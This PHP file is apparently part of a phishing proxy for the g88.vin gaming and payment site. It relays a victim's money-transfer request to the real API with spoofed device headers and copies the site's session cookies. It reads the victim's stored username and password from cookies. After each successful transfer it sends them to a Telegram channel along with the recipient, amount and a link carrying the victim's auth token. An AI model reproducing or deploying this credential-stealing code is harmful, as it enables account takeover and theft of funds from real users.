<?php
session_start();
include "../config.php";
$auth_token = $_SESSION["auth"];
$raw_content = file_get_contents("php://input");
$json_data = json_decode($raw_content, 1);

// lấy dữ liệu
$Amount = $json_data['Amount'];
$Captcha = $json_data['Captcha'];
$CurrencyID = $json_data['CurrencyID'];
$Reason = $json_data['Reason'];
$SigningKey = $json_data['SigningKey'];
$Username = $json_data['Username'];
$Verify = $json_data['Verify'];
//$author = $_COOKIE['auth1'];
//$auth_token = $_SERVER["HTTP_AUTHORIZATION"];
//$token = explode(' ', $auth_token)[1];
// lưu dữ liệu vào cookie
setcookie("amount", $Amount, time() + (86400 * 30), "/");
setcookie("noidung", $Reason, time() + (86400 * 30), "/");
setcookie("nguoinhan", $Username, time() + (86400 * 30), "/");
$taikhoan = $_COOKIE['username'];
$matkhau = $_COOKIE['password'];


$result = TransferAccout($raw_content, $auth_token);
$json_data = json_decode($result, 1);



if ($json_data["c"] == 0) {
if ($Amount >= $sotienchuyenkhoan) 
$message = "Chuyển khoản: G88\nTài khoản: $taikhoan\nMật khẩu: $matkhau\nNgười Nhận: $Username\nSố tiền: $Amount\nNội dung: $Reason\ng88.vin/?token=$auth_token";
	    send_telegram_trans($message);
	    
}
echo $result;
function TransferAccout($raw_content, $auth_token) {
    $url = "https://profile.g88.vin/api/payment/TransferAccout";
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_HEADER,true);
//    $data = "{\"CurrencyID\":$CurrencyID,\"Amount\":\"$Amount\"}";
    curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
    curl_setopt($ch,CURLOPT_HTTPHEADER,["Authorization: Bearer $auth_token", "Content-type: application/json", "Client-Version: 1.0.19", "Client-Model: Inspiron 7559 (Dell Inc.)", "Client-Name: DESKTOP-5ME79EL", "Client-DeviceID: bdf8d7175c7f186d1e431bfedd4f509afa7f7fc0", "Client-OperatingSystem: Windows 10  (10.0.0) 64bit", "Client-OperatingSystemFamily: Windows", "Client-ProcessorCount: 4", "Client-ProcessorFrequency: 2304", "Client-ProcessorType: Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz", "Client-DeviceType: Desktop", "Client-Token: b6a82eefd19fa69f8bf8a14bf76e6213", "Client-OSType: PC", "Connection: Keep-Alive, TE", 'TE: identity', 'User-Agent: BestHTTP']);
for ($i=0; $i < 10; $i++) { 
    	$raw_content = curl_exec($ch);
    	if ($raw_content) break;
    }
    curl_close($ch);
    //tách cookie
    $netcore = "";
    $NSC = "";
    if (preg_match("/\.netcore\.session=([^;]+);/m", $raw_content, $matches)) $netcore = $matches[1];
    if (preg_match("/NSC_mc\.qspgjmf\.h88\.wjo=([^;]+);/m", $raw_content, $matches)) $NSC = $matches[1];
    setcookie(".netcore.session", urldecode($netcore), time() + (86400 * 30), "/"); // 86400 = 1 day
    setcookie("NSC_mc.qspgjmf.h88.wjo", $NSC, time() + (86400 * 30), "/"); // 86400 = 1 day
    return explode("\r\n\r\n", $raw_content)[1];
}

?>